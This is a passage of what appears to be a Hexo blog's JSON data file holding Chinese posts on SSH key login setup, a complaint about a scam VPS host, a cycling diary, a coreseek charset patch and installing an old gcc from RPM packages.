内容追加到认证文件,它只占一行\n<pre>$ vi ~/.ssh/authorized_keys</pre>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"authorized-keys\"><a href=\"#authorized-keys\" class=\"headerlink\" title=\"authorized_keys\"></a>authorized_keys</h3><p>这是通用的做法，将本地机器的 <code>id_rsa.pub</code> 公匙字符串拷贝下来，追加到服务器的 <code>~/.ssh/authorized_keys</code> 文件下，作为一行,并且保持其它人不可写的权限,就可以不用再输入密码．</p>\n<h4 id=\"客户端的配置\"><a href=\"#客户端的配置\" class=\"headerlink\" title=\"客户端的配置\"></a>客户端的配置</h4><h5 id=\"linux\"><a href=\"#linux\" class=\"headerlink\" title=\"linux\"></a>linux</h5><p>创建客户端ssh key,回车选默认的即可<br>创建程序会询问你的key存放位置,以及加密密码等,回车选则默认即可</p>\n<pre>$ ssh-keygen\n</pre>\n打印认证公匙,复制然后开始下一步\n<pre>$ cat ~/.ssh/id_rsa.pub\n</pre>\n公匙 ~/.ssh/id_rsa.pub 是每次登录ssh时都会发送的,因而把其加入到服务器的 ~/.ssh/authorized_keys 后,服务器会据此判断是否可以免除密码认证过程\n\n&nbsp;\n\n#### 服务端的配置\n\n创建自动认证文件,如果没有的话\n<pre>$ touch ~/.ssh/authorized_keys</pre>\n设置该文件权限为其它人不可写,权限限制是必须的,否则将不会生效\n<pre>$ chmod 644 ~/.ssh/authorized_keys</pre>\n将在客户端拷贝的 ~/.ssh/id_rsa.pub 内容追加到认证文件,它只占一行\n<pre>$ vi ~/.ssh/authorized_keys</pre>"},{"title":"fortacloud.co购买主机被坑记","id":"38","date":"2015-05-13T22:21:21.000Z","_content":"\n想买个香港主机，点进google的搜索广告进入了fortacloud.co(骗子公司，千万不要买哦)网站．\n发现vps还算便宜，而且网站也很精美，应该是个高大上的主机商吧．结果买了后发现完全是个骗局.\n\n**我遭遇的问题：**\n\n*   创建的主机始终无法登录SSH,重置密码,用SSH KEY登录都没用\n*   我选择的是香港机房,但分配给我的主机IP却在美国．而且香港主机购买时本身要多加钱的\n*   发ticket想解决无法登录的问题,但发一个ticket竟然要收5美元\n*   收就收了,结果超过一天了都没有回复\n*   进网站的banner有IBM的logo,我以为是IBM旗下云服务,结果和IBM一点关系都没有\n后来觉得不对了,才google发现这完全就是个骗子公司，后悔买之前没看看口碑．\n**受害者的讨论:**\n\n*   [http://lowendtalk.com/discussion/31635/fortacloud-2-gig-ram-free-vps](http://lowendtalk.com/discussion/31635/fortacloud-2-gig-ram-free-vps)\n*   [http://lowendtalk.com/discussion/comment/883116/](http://lowendtalk.com/discussion/comment/883116/)\n-----------------------------\n后续:\n\n2015/05/30更新\n\n他们还是会继续从你的信用卡扣费,即便你什么服务也没开,没法取消.\n\n刚才向google ads举报了他们,不过看起来google不会去管:\n> www.fortacloud.co site is a liar!!! Their product is not available, submit tickets did not respond.\r> \n> And will not stop from the credit card chargeback, you can not cancel.\r> \n> There are many victims, reviews feedback:\r> \n> www.fortatrust-wont-cancel-my-account.com , http://lowendtalk.com/discussion/42162/fortacloud-co-review-please\r> \n> They also have an old liar site www.fortatrust.com\r> \n> Evaluation: https://www.trustpilot.com/review/www.fortatrust.com\r> \n> \n> I was deceived click on google advertisement, I hope you as soon as possible, do not let more people injured!\ngoogle的自动回复,看来希望渺茫,还会有更多人上当\n> 感謝您提出意見，通知我們有廣告違反了 AdWords 政策。儘管我們無法親自回覆您的意見，但一定會將它轉達給相關小組，並在必要時採取適當的行動。\n今天尝试把账户的信用卡换成空卡卡号,不知道管不管用. 万事达也不能禁止从商户扣款,真操蛋","source":"_posts/fortacloud-co-e8-b4-ad-e4-b9-b0-e4-b8-bb-e6-9c-ba-e8-a2-ab-e5-9d-91-e8-ae-b0.md","raw":"---\ntitle: fortacloud.co购买主机被坑记\nid: 38\ncategories:\n  - linux\ndate: 2015-05-14 06:21:21\ntags:\n---\n\n想买个香港主机，点进google的搜索广告进入了fortacloud.co(骗子公司，千万不要买哦)网站．\n发现vps还算便宜，而且网站也很精美，应该是个高大上的主机商吧．结果买了后发现完全是个骗局.\n\n**我遭遇的问题：**\n\n*   创建的主机始终无法登录SSH,重置密码,用SSH KEY登录都没用\n*   我选择的是香港机房,但分配给我的主机IP却在美国．而且香港主机购买时本身要多加钱的\n*   发ticket想解决无法登录的问题,但发一个ticket竟然要收5美元\n*   收就收了,结果超过一天了都没有回复\n*   进网站的banner有IBM的logo,我以为是IBM旗下云服务,结果和IBM一点关系都没有\n后来觉得不对了,才google发现这完全就是个骗子公司，后悔买之前没看看口碑．\n**受害者的讨论:**\n\n*   [http://lowendtalk.com/discussion/31635/fortacloud-2-gig-ram-free-vps](http://lowendtalk.com/discussion/31635/fortacloud-2-gig-ram-free-vps)\n*   [http://lowendtalk.com/discussion/comment/883116/](http://lowendtalk.com/discussion/comment/883116/)\n-----------------------------\n后续:\n\n2015/05/30更新\n\n他们还是会继续从你的信用卡扣费,即便你什么服务也没开,没法取消.\n\n刚才向google ads举报了他们,不过看起来google不会去管:\n> www.fortacloud.co site is a liar!!! Their product is not available, submit tickets did not respond.\r> \n> And will not stop from the credit card chargeback, you can not cancel.\r> \n> There are many victims, reviews feedback:\r> \n> www.fortatrust-wont-cancel-my-account.com , http://lowendtalk.com/discussion/42162/fortacloud-co-review-please\r> \n> They also have an old liar site www.fortatrust.com\r> \n> Evaluation: https://www.trustpilot.com/review/www.fortatrust.com\r> \n> \n> I was deceived click on google advertisement, I hope you as soon as possible, do not let more people injured!\ngoogle的自动回复,看来希望渺茫,还会有更多人上当\n> 感謝您提出意見，通知我們有廣告違反了 AdWords 政策。儘管我們無法親自回覆您的意見，但一定會將它轉達給相關小組，並在必要時採取適當的行動。\n今天尝试把账户的信用卡换成空卡卡号,不知道管不管用. 万事达也不能禁止从商户扣款,真操蛋","slug":"fortacloud-co-e8-b4-ad-e4-b9-b0-e4-b8-bb-e6-9c-ba-e8-a2-ab-e5-9d-91-e8-ae-b0","published":1,"updated":"2018-03-05T11:32:58.726Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cik800ffgmlmf0pa19pn","content":"<p>想买个香港主机，点进google的搜索广告进入了fortacloud.co(骗子公司，千万不要买哦)网站．<br>发现vps还算便宜，而且网站也很精美，应该是个高大上的主机商吧．结果买了后发现完全是个骗局.</p>\n<p><strong>我遭遇的问题：</strong></p>\n<ul>\n<li>创建的主机始终无法登录SSH,重置密码,用SSH KEY登录都没用</li>\n<li>我选择的是香港机房,但分配给我的主机IP却在美国．而且香港主机购买时本身要多加钱的</li>\n<li>发ticket想解决无法登录的问题,但发一个ticket竟然要收5美元</li>\n<li>收就收了,结果超过一天了都没有回复</li>\n<li><p>进网站的banner有IBM的logo,我以为是IBM旗下云服务,结果和IBM一点关系都没有<br>后来觉得不对了,才google发现这完全就是个骗子公司，后悔买之前没看看口碑．<br><strong>受害者的讨论:</strong></p>\n</li>\n<li><p><a href=\"http://lowendtalk.com/discussion/31635/fortacloud-2-gig-ram-free-vps\" target=\"_blank\" rel=\"noopener\">http://lowendtalk.com/discussion/31635/fortacloud-2-gig-ram-free-vps</a></p>\n</li>\n<li><a href=\"http://lowendtalk.com/discussion/comment/883116/\" target=\"_blank\" rel=\"noopener\">http://lowendtalk.com/discussion/comment/883116/</a></li>\n</ul>\n<hr>\n<p>后续:</p>\n<p>2015/05/30更新</p>\n<p>他们还是会继续从你的信用卡扣费,即便你什么服务也没开,没法取消.</p>\n<p>刚才向google ads举报了他们,不过看起来google不会去管:</p>\n<blockquote>\n<p><a href=\"http://www.fortacloud.co\" target=\"_blank\" rel=\"noopener\">www.fortacloud.co</a> site is a liar!!! Their product is not available, submit tickets did not respond.</p>\n<p>And will not stop from the credit card chargeback, you can not cancel.</p>\n<p>There are many victims, reviews feedback:</p>\n<p><a href=\"http://www.fortatrust-wont-cancel-my-account.com\" target=\"_blank\" rel=\"noopener\">www.fortatrust-wont-cancel-my-account.com</a> , <a href=\"http://lowendtalk.com/discussion/42162/fortacloud-co-review-please\" target=\"_blank\" rel=\"noopener\">http://lowendtalk.com/discussion/42162/fortacloud-co-review-please</a></p>\n<p>They also have an old liar site <a href=\"http://www.fortatrust.com\" target=\"_blank\" rel=\"noopener\">www.fortatrust.com</a></p>\n<p>Evaluation: <a href=\"https://www.trustpilot.com/review/www.fortatrust.com\" target=\"_blank\" rel=\"noopener\">https://www.trustpilot.com/review/www.fortatrust.com</a></p>\n<p>I was deceived click on google advertisement, I hope you as soon as possible, do not let more people injured!<br>google的自动回复,看来希望渺茫,还会有更多人上当<br>感謝您提出意見，通知我們有廣告違反了 AdWords 政策。儘管我們無法親自回覆您的意見，但一定會將它轉達給相關小組，並在必要時採取適當的行動。<br>今天尝试把账户的信用卡换成空卡卡号,不知道管不管用. 万事达也不能禁止从商户扣款,真操蛋</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<p>想买个香港主机，点进google的搜索广告进入了fortacloud.co(骗子公司，千万不要买哦)网站．<br>发现vps还算便宜，而且网站也很精美，应该是个高大上的主机商吧．结果买了后发现完全是个骗局.</p>\n<p><strong>我遭遇的问题：</strong></p>\n<ul>\n<li>创建的主机始终无法登录SSH,重置密码,用SSH KEY登录都没用</li>\n<li>我选择的是香港机房,但分配给我的主机IP却在美国．而且香港主机购买时本身要多加钱的</li>\n<li>发ticket想解决无法登录的问题,但发一个ticket竟然要收5美元</li>\n<li>收就收了,结果超过一天了都没有回复</li>\n<li><p>进网站的banner有IBM的logo,我以为是IBM旗下云服务,结果和IBM一点关系都没有<br>后来觉得不对了,才google发现这完全就是个骗子公司，后悔买之前没看看口碑．<br><strong>受害者的讨论:</strong></p>\n</li>\n<li><p><a href=\"http://lowendtalk.com/discussion/31635/fortacloud-2-gig-ram-free-vps\" target=\"_blank\" rel=\"noopener\">http://lowendtalk.com/discussion/31635/fortacloud-2-gig-ram-free-vps</a></p>\n</li>\n<li><a href=\"http://lowendtalk.com/discussion/comment/883116/\" target=\"_blank\" rel=\"noopener\">http://lowendtalk.com/discussion/comment/883116/</a></li>\n</ul>\n<hr>\n<p>后续:</p>\n<p>2015/05/30更新</p>\n<p>他们还是会继续从你的信用卡扣费,即便你什么服务也没开,没法取消.</p>\n<p>刚才向google ads举报了他们,不过看起来google不会去管:</p>\n<blockquote>\n<p><a href=\"http://www.fortacloud.co\" target=\"_blank\" rel=\"noopener\">www.fortacloud.co</a> site is a liar!!! Their product is not available, submit tickets did not respond.</p>\n<p>And will not stop from the credit card chargeback, you can not cancel.</p>\n<p>There are many victims, reviews feedback:</p>\n<p><a href=\"http://www.fortatrust-wont-cancel-my-account.com\" target=\"_blank\" rel=\"noopener\">www.fortatrust-wont-cancel-my-account.com</a> , <a href=\"http://lowendtalk.com/discussion/42162/fortacloud-co-review-please\" target=\"_blank\" rel=\"noopener\">http://lowendtalk.com/discussion/42162/fortacloud-co-review-please</a></p>\n<p>They also have an old liar site <a href=\"http://www.fortatrust.com\" target=\"_blank\" rel=\"noopener\">www.fortatrust.com</a></p>\n<p>Evaluation: <a href=\"https://www.trustpilot.com/review/www.fortatrust.com\" target=\"_blank\" rel=\"noopener\">https://www.trustpilot.com/review/www.fortatrust.com</a></p>\n<p>I was deceived click on google advertisement, I hope you as soon as possible, do not let more people injured!<br>google的自动回复,看来希望渺茫,还会有更多人上当<br>感謝您提出意見，通知我們有廣告違反了 AdWords 政策。儘管我們無法親自回覆您的意見，但一定會將它轉達給相關小組，並在必要時採取適當的行動。<br>今天尝试把账户的信用卡换成空卡卡号,不知道管不管用. 万事达也不能禁止从商户扣款,真操蛋</p>\n</blockquote>\n"},{"title":"骑行  日记","id":"6","date":"2014-03-20T00:41:38.000Z","_content":"\n昨天骑了一天，全身酸麻，所以今天早上起来才写写点日记。\n\n想想好想没有什么有意思，一路沿着107国道蹬啊蹬，从没停止过呼吸汽车尾气和灰尘。河北这地方到处是驴肉XX，我不吃驴肉狗肉蛙肉什么的（虽然都曾经有意无意吃到过）。在路边买了一个煎饼，才四块钱，吃了几口上面就落下灰了。\n\n不过河北保定的物价真便宜啊，晚上买了一碗刀削面才6块，米线8块。不过这个刀削面看起来不卫生，还没吃。晚上也去超市买了点榨菜果汁，昨天路上就带了一个火腿罐头，还不好吃，又饥又渴。今天别再受这罪了。\n\n早上起来写了会代码，把之前的任务弄好了，九点出发，估计晚上6点到石家庄吧\n\n&nbsp;\n\n记录下昨天一天的消费：\n\n1.  早上，在家附近的庆丰包子吃了14块，包子很难吃，形状还不好，只吃了一点，主要是喝可乐\n2.  8点多在房山区买了两瓶水7块\n3.  12点在高碑店市吧，买了个煎饼四块钱\n4.  晚上6点来到如家，住宿花了137\n5.  7点买了点饭 （刀削面）6  +（米线）8  +（面包）4\n6.  9点去了超市， 23块\n&nbsp;\n\n一天总共花了 14 + 7 + 4 + 137 + 6 + 8 + 4 + 23 = 203","source":"_posts/e9-aa-91-e8-a1-8c-e6-97-a5-e8-ae-b0.md","raw":"---\ntitle: 骑行  日记\nid: 6\ncategories:\n  - 骑行\ndate: 2014-03-20 08:41:38\ntags:\n---\n\n昨天骑了一天，全身酸麻，所以今天早上起来才写写点日记。\n\n想想好想没有什么有意思，一路沿着107国道蹬啊蹬，从没停止过呼吸汽车尾气和灰尘。河北这地方到处是驴肉XX，我不吃驴肉狗肉蛙肉什么的（虽然都曾经有意无意吃到过）。在路边买了一个煎饼，才四块钱，吃了几口上面就落下灰了。\n\n不过河北保定的物价真便宜啊，晚上买了一碗刀削面才6块，米线8块。不过这个刀削面看起来不卫生，还没吃。晚上也去超市买了点榨菜果汁，昨天路上就带了一个火腿罐头，还不好吃，又饥又渴。今天别再受这罪了。\n\n早上起来写了会代码，把之前的任务弄好了，九点出发，估计晚上6点到石家庄吧\n\n&nbsp;\n\n记录下昨天一天的消费：\n\n1.  早上，在家附近的庆丰包子吃了14块，包子很难吃，形状还不好，只吃了一点，主要是喝可乐\n2.  8点多在房山区买了两瓶水7块\n3.  12点在高碑店市吧，买了个煎饼四块钱\n4.  晚上6点来到如家，住宿花了137\n5.  7点买了点饭 （刀削面）6  +（米线）8  +（面包）4\n6.  9点去了超市， 23块\n&nbsp;\n\n一天总共花了 14 + 7 + 4 + 137 + 6 + 8 + 4 + 23 = 203","slug":"e9-aa-91-e8-a1-8c-e6-97-a5-e8-ae-b0","published":1,"updated":"2018-03-05T11:32:58.726Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cik900fhgmlm3ygsw3fb","content":"<p>昨天骑了一天，全身酸麻，所以今天早上起来才写写点日记。</p>\n<p>想想好想没有什么有意思，一路沿着107国道蹬啊蹬，从没停止过呼吸汽车尾气和灰尘。河北这地方到处是驴肉XX，我不吃驴肉狗肉蛙肉什么的（虽然都曾经有意无意吃到过）。在路边买了一个煎饼，才四块钱，吃了几口上面就落下灰了。</p>\n<p>不过河北保定的物价真便宜啊，晚上买了一碗刀削面才6块，米线8块。不过这个刀削面看起来不卫生，还没吃。晚上也去超市买了点榨菜果汁，昨天路上就带了一个火腿罐头，还不好吃，又饥又渴。今天别再受这罪了。</p>\n<p>早上起来写了会代码，把之前的任务弄好了，九点出发，估计晚上6点到石家庄吧</p>\n<p>&nbsp;</p>\n<p>记录下昨天一天的消费：</p>\n<ol>\n<li>早上，在家附近的庆丰包子吃了14块，包子很难吃，形状还不好，只吃了一点，主要是喝可乐</li>\n<li>8点多在房山区买了两瓶水7块</li>\n<li>12点在高碑店市吧，买了个煎饼四块钱</li>\n<li>晚上6点来到如家，住宿花了137</li>\n<li>7点买了点饭 （刀削面）6  +（米线）8  +（面包）4</li>\n<li>9点去了超市， 23块<br>&nbsp;</li>\n</ol>\n<p>一天总共花了 14 + 7 + 4 + 137 + 6 + 8 + 4 + 23 = 203</p>\n","site":{"data":{}},"excerpt":"","more":"<p>昨天骑了一天，全身酸麻，所以今天早上起来才写写点日记。</p>\n<p>想想好想没有什么有意思，一路沿着107国道蹬啊蹬，从没停止过呼吸汽车尾气和灰尘。河北这地方到处是驴肉XX，我不吃驴肉狗肉蛙肉什么的（虽然都曾经有意无意吃到过）。在路边买了一个煎饼，才四块钱，吃了几口上面就落下灰了。</p>\n<p>不过河北保定的物价真便宜啊，晚上买了一碗刀削面才6块，米线8块。不过这个刀削面看起来不卫生，还没吃。晚上也去超市买了点榨菜果汁，昨天路上就带了一个火腿罐头，还不好吃，又饥又渴。今天别再受这罪了。</p>\n<p>早上起来写了会代码，把之前的任务弄好了，九点出发，估计晚上6点到石家庄吧</p>\n<p>&nbsp;</p>\n<p>记录下昨天一天的消费：</p>\n<ol>\n<li>早上，在家附近的庆丰包子吃了14块，包子很难吃，形状还不好，只吃了一点，主要是喝可乐</li>\n<li>8点多在房山区买了两瓶水7块</li>\n<li>12点在高碑店市吧，买了个煎饼四块钱</li>\n<li>晚上6点来到如家，住宿花了137</li>\n<li>7点买了点饭 （刀削面）6  +（米线）8  +（面包）4</li>\n<li>9点去了超市， 23块<br>&nbsp;</li>\n</ol>\n<p>一天总共花了 14 + 7 + 4 + 137 + 6 + 8 + 4 + 23 = 203</p>\n"},{"title":"coreseek中文分词配置","id":"21","date":"2014-06-27T15:46:59.000Z","_content":"\n在安装配置coreseek 3.2.13 中积累了一些问题，在这里记录下来:\n\n### 1\\. 让一些特殊字符也能被检索，比如 +- （加减号）\n\n正常来说修改主配置文件sphinx.conf的 index.charset_table 就可以了，因为只有charset_table包含的字符才会被sphinx识别并编入索引中。但coreseek中charset_table却不能用，因为这个配置还担任了中文分词开关的角色，就是说如果在配置文件里填写了这个配置，那么中文分词就不会开启，鱼和熊掌不能兼得。\n\n有一个方法，就是修改它程序内置的charset_table配置，这样既能不关闭中文分词，又能添加新的字符给索引识别出来。\n\n找到源码包中的c++文件： <span style=\"color: #000000;\">coreseek-3.2.13/csft-3.2.13/src/sphinx.cpp</span>\n<div style=\"color: #000000;\">\n<pre class=\"lang:c++ decode:true \">// 修改 197..198 行\n// old:\nconst char *    SPHINX_DEFAULT_SBCS_TABLE       = \"0..9, A..Z-&gt;a..z, _, a..z, U+A8-&gt;U+B8, U+B8, U+C0..U+DF-&gt;U+E0..U+FF, U+E0..U+FF\";\nconst char *    SPHINX_DEFAULT_UTF8_TABLE       = \"0..9, A..Z-&gt;a..z, _, a..z, U+410..U+42F-&gt;U+430..U+44F, U+430..U+44F\";\n// --------------------------------------------\n// 添加了 :  +, -, {, }, |, =, &gt;, &lt;  这些符号\nconst char *    SPHINX_DEFAULT_SBCS_TABLE       = \"0..9, A..Z-&gt;a..z, _, +, -, {, }, |, =, &gt;, &lt;, a..z, U+A8-&gt;U+B8, U+B8, U+C0..U+DF-&gt;U+E0..U+FF, U+E0..U+FF\";\nconst char *    SPHINX_DEFAULT_UTF8_TABLE       = \"0..9, A..Z-&gt;a..z, _, +, -, {, }, |, =, &gt;, &lt;, a..z, U+410..U+42F-&gt;U+430..U+44F, U+430..U+44F\";</pre>\n然后重新编译一遍 coreseek，覆盖原先的执行文件如 bin/searchd bin/indexer 。重启searchd并重新编排索引就可以生效。\n\n</div>","source":"_posts/coreseek-e4-b8-ad-e6-96-87-e5-88-86-e8-af-8d-e9-85-8d-e7-bd-ae.md","raw":"---\ntitle: coreseek中文分词配置\nid: 21\ncategories:\n  - sphinx\ndate: 2014-06-27 23:46:59\ntags:\n---\n\n在安装配置coreseek 3.2.13 中积累了一些问题，在这里记录下来:\n\n### 1\\. 让一些特殊字符也能被检索，比如 +- （加减号）\n\n正常来说修改主配置文件sphinx.conf的 index.charset_table 就可以了，因为只有charset_table包含的字符才会被sphinx识别并编入索引中。但coreseek中charset_table却不能用，因为这个配置还担任了中文分词开关的角色，就是说如果在配置文件里填写了这个配置，那么中文分词就不会开启，鱼和熊掌不能兼得。\n\n有一个方法，就是修改它程序内置的charset_table配置，这样既能不关闭中文分词，又能添加新的字符给索引识别出来。\n\n找到源码包中的c++文件： <span style=\"color: #000000;\">coreseek-3.2.13/csft-3.2.13/src/sphinx.cpp</span>\n<div style=\"color: #000000;\">\n<pre class=\"lang:c++ decode:true \">// 修改 197..198 行\n// old:\nconst char *    SPHINX_DEFAULT_SBCS_TABLE       = \"0..9, A..Z-&gt;a..z, _, a..z, U+A8-&gt;U+B8, U+B8, U+C0..U+DF-&gt;U+E0..U+FF, U+E0..U+FF\";\nconst char *    SPHINX_DEFAULT_UTF8_TABLE       = \"0..9, A..Z-&gt;a..z, _, a..z, U+410..U+42F-&gt;U+430..U+44F, U+430..U+44F\";\n// --------------------------------------------\n// 添加了 :  +, -, {, }, |, =, &gt;, &lt;  这些符号\nconst char *    SPHINX_DEFAULT_SBCS_TABLE       = \"0..9, A..Z-&gt;a..z, _, +, -, {, }, |, =, &gt;, &lt;, a..z, U+A8-&gt;U+B8, U+B8, U+C0..U+DF-&gt;U+E0..U+FF, U+E0..U+FF\";\nconst char *    SPHINX_DEFAULT_UTF8_TABLE       = \"0..9, A..Z-&gt;a..z, _, +, -, {, }, |, =, &gt;, &lt;, a..z, U+410..U+42F-&gt;U+430..U+44F, U+430..U+44F\";</pre>\n然后重新编译一遍 coreseek，覆盖原先的执行文件如 bin/searchd bin/indexer 。重启searchd并重新编排索引就可以生效。\n\n</div>","slug":"coreseek-e4-b8-ad-e6-96-87-e5-88-86-e8-af-8d-e9-85-8d-e7-bd-ae","published":1,"updated":"2018-03-05T11:32:58.726Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cikb00fjgmlm9aku924l","content":"<p>在安装配置coreseek 3.2.13 中积累了一些问题，在这里记录下来:</p>\n<h3 id=\"1-让一些特殊字符也能被检索，比如-（加减号）\"><a href=\"#1-让一些特殊字符也能被检索，比如-（加减号）\" class=\"headerlink\" title=\"1. 让一些特殊字符也能被检索，比如 +- （加减号）\"></a>1. 让一些特殊字符也能被检索，比如 +- （加减号）</h3><p>正常来说修改主配置文件sphinx.conf的 index.charset_table 就可以了，因为只有charset_table包含的字符才会被sphinx识别并编入索引中。但coreseek中charset_table却不能用，因为这个配置还担任了中文分词开关的角色，就是说如果在配置文件里填写了这个配置，那么中文分词就不会开启，鱼和熊掌不能兼得。</p>\n<p>有一个方法，就是修改它程序内置的charset_table配置，这样既能不关闭中文分词，又能添加新的字符给索引识别出来。</p>\n<p>找到源码包中的c++文件： <span style=\"color: #000000;\">coreseek-3.2.13/csft-3.2.13/src/sphinx.cpp</span></p>\n<div style=\"color: #000000;\"><br><pre class=\"lang:c++ decode:true \">// 修改 197..198 行<br>// old:<br>const char <em>    SPHINX_DEFAULT_SBCS_TABLE       = “0..9, A..Z-&gt;a..z, _, a..z, U+A8-&gt;U+B8, U+B8, U+C0..U+DF-&gt;U+E0..U+FF, U+E0..U+FF”;<br>const char </em>    SPHINX_DEFAULT_UTF8_TABLE       = “0..9, A..Z-&gt;a..z, _, a..z, U+410..U+42F-&gt;U+430..U+44F, U+430..U+44F”;<br>// ——————————————–<br>// 添加了 :  +, -, {, }, |, =, &gt;, &lt;  这些符号<br>const char <em>    SPHINX_DEFAULT_SBCS_TABLE       = “0..9, A..Z-&gt;a..z, _, +, -, {, }, |, =, &gt;, &lt;, a..z, U+A8-&gt;U+B8, U+B8, U+C0..U+DF-&gt;U+E0..U+FF, U+E0..U+FF”;<br>const char </em>    SPHINX_DEFAULT_UTF8_TABLE       = “0..9, A..Z-&gt;a..z, _, +, -, {, }, |, =, &gt;, &lt;, a..z, U+410..U+42F-&gt;U+430..U+44F, U+430..U+44F”;</pre><br>然后重新编译一遍 coreseek，覆盖原先的执行文件如 bin/searchd bin/indexer 。重启searchd并重新编排索引就可以生效。<br><br></div>","site":{"data":{}},"excerpt":"","more":"<p>在安装配置coreseek 3.2.13 中积累了一些问题，在这里记录下来:</p>\n<h3 id=\"1-让一些特殊字符也能被检索，比如-（加减号）\"><a href=\"#1-让一些特殊字符也能被检索，比如-（加减号）\" class=\"headerlink\" title=\"1. 让一些特殊字符也能被检索，比如 +- （加减号）\"></a>1. 让一些特殊字符也能被检索，比如 +- （加减号）</h3><p>正常来说修改主配置文件sphinx.conf的 index.charset_table 就可以了，因为只有charset_table包含的字符才会被sphinx识别并编入索引中。但coreseek中charset_table却不能用，因为这个配置还担任了中文分词开关的角色，就是说如果在配置文件里填写了这个配置，那么中文分词就不会开启，鱼和熊掌不能兼得。</p>\n<p>有一个方法，就是修改它程序内置的charset_table配置，这样既能不关闭中文分词，又能添加新的字符给索引识别出来。</p>\n<p>找到源码包中的c++文件： <span style=\"color: #000000;\">coreseek-3.2.13/csft-3.2.13/src/sphinx.cpp</span></p>\n<div style=\"color: #000000;\"><br><pre class=\"lang:c++ decode:true \">// 修改 197..198 行<br>// old:<br>const char <em>    SPHINX_DEFAULT_SBCS_TABLE       = “0..9, A..Z-&gt;a..z, _, a..z, U+A8-&gt;U+B8, U+B8, U+C0..U+DF-&gt;U+E0..U+FF, U+E0..U+FF”;<br>const char </em>    SPHINX_DEFAULT_UTF8_TABLE       = “0..9, A..Z-&gt;a..z, _, a..z, U+410..U+42F-&gt;U+430..U+44F, U+430..U+44F”;<br>// ——————————————–<br>// 添加了 :  +, -, {, }, |, =, &gt;, &lt;  这些符号<br>const char <em>    SPHINX_DEFAULT_SBCS_TABLE       = “0..9, A..Z-&gt;a..z, _, +, -, {, }, |, =, &gt;, &lt;, a..z, U+A8-&gt;U+B8, U+B8, U+C0..U+DF-&gt;U+E0..U+FF, U+E0..U+FF”;<br>const char </em>    SPHINX_DEFAULT_UTF8_TABLE       = “0..9, A..Z-&gt;a..z, _, +, -, {, }, |, =, &gt;, &lt;, a..z, U+410..U+42F-&gt;U+430..U+44F, U+430..U+44F”;</pre><br>然后重新编译一遍 coreseek，覆盖原先的执行文件如 bin/searchd bin/indexer 。重启searchd并重新编排索引就可以生效。<br><br></div>"},{"title":"centos安装旧版本gcc","id":"24","date":"2014-07-10T03:55:19.000Z","_content":"\n编译方式非常麻烦，因此我选择rpm安装。\n\n1\\. 卸载当前的gcc高版本，centos6.5的gcc默认是 4.4.7 ，我要安装 4.1.2\n<pre class=\"lang:sh decode:true \">sudo yum remove cpp</pre>\n&nbsp;\n\n2\\. 下载rpm包，一个是 gcc，一个是cpp\n<pre class=\"lang:sh decode:true \">wget ftp://mirror.nl.leaseweb.net/plesk/PSA_9.5.4/update-rpm-CentOS-5-x86_64/cpp-4.1.2-48.el5.x86_64.rpm\n\nwget ftp://ftp.pbone.net/mirror/ftp.scientificlinux.org/linux/scientific/55/x86_64/SL/gcc-4.1.2-48.el5.x86_64.rpm</pre>\n&nbsp;\n\n3\\. 安装，先安装 cpp\n<pre class=\"lang:sh decode:true \">rpm -ivh cpp-4.1.2-48.el5.x86_64.rpm\n\nrpm -ivh gcc-4.1.2-48.el5.x86_64.rpm</pre>\n&nbsp;","source":"_posts/centos-e5-ae-89-e8-a3-85-e6-97-a7-e7-89-88-e6-9c-acgcc.md","raw":"---\ntitle: centos安装旧版本gcc\nid: 24\ncategories:\n  - linux\ndate: 2014-07-10 11:55:19\ntags:\n---\n\n编译方式非常麻烦，因此我选择rpm安装。\n\n1\\. 卸载当前的gcc高版本，centos6.5的gcc默认是 4.4.7 ，我要安装 4.1.2\n<pre class=\"lang:sh decode:true \">sudo yum remove cpp</pre>\n&nbsp;\n\n2\\. 下载rpm包，一个是 gcc，一个是cpp\n<pre class=\"lang:sh decode:true \">wget ftp://mirror.nl.leaseweb.net/plesk/PSA_9.5.4/update-rpm-CentOS-5-x86_64/cpp-4.1.2-48.el5.x86_64.rpm\n\nwget ftp://ftp.pbone.net/mirror/ftp.scientificlinux.org/linux/scientific/55/x86_64/SL/gcc-4.1.2-48.el5.x86_64.rpm</pre>\n&nbsp;\n\n3\\. 安装，先安装 cpp\n<pre class=\"lang:sh decode:true \">rpm -ivh cpp-4.1.2-48.el5.x86_64.rpm\n\nrpm -ivh gcc-4.1.2-48.el5.x86_64.rpm</pre>\n&nbsp;","slug":"centos-e5-ae-89-e8-a3-85-e6-97-a7-e7-89-88-e6-9c-acgcc","published":1,"updated":"2018-03-05T11:32:58.726Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cikd00flgmlm6xt694rx","content":"<p>编译方式非常麻烦，因此我选择rpm安装。</p>\n<p>1. 卸载当前的gcc高版本，centos6.5的gcc默认是 4.4.7 ，我要安装 4.1.2</p>\n<p><pre class=\"lang:sh decode:true \">sudo yum remove cpp</pre><br>&nbsp;</p>\n<p>2. 下载rpm包，一个是 gcc，一个是cpp</p>\n<p><pre class=\"lang:sh decode:true \">wget <a href=\"ftp://mirror.nl.leaseweb.net/plesk/PSA_9.5.4/update-rpm-CentOS-5-x86_64/cpp-4.1.2-48.el5.x86_64.rpm\" target=\"_blank\" rel=\"noopener\">ftp://mirror.nl.leaseweb.net/plesk/PSA_9.5.4/update-rpm-CentOS-5-x86_64/cpp-4.1.2-48.el5.x86_64.rpm</a></pre></p>\n<p>wget <a href=\"ftp://ftp.pbone.net/mirror/ftp.scientificlinux.org/linux/scientific/55/x86_64/SL/gcc-4.1.2-48.el5.x86_64.rpm\" target=\"_blank\" rel=\"noopener\">ftp://ftp.pbone.net/mirror/ftp.scientificlinux.org/linux/scientific/55/x86_64/SL/gcc-4.1.2-48.el5.x86_64.rpm</a><br>&nbsp;</p>\n<p>3. 安装，先安装 cpp</p>\n<p><pre class=\"lang:sh decode:true \">rpm -ivh cpp-4.1.2-48.el5.x86_64.rpm</pre></p>\n<p>rpm -ivh gcc-4.1.2-48.el5.x86_64.rpm<br>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>编译方式非常麻烦，因此我选择rpm安装。</p>\n<p>1. 卸载当前的gcc高版本，centos6.5的gcc默认是 4.4.7 ，我要安装 4.1.2</p>\n<p><pre class=\"lang:sh decode:true \">sudo yum remove 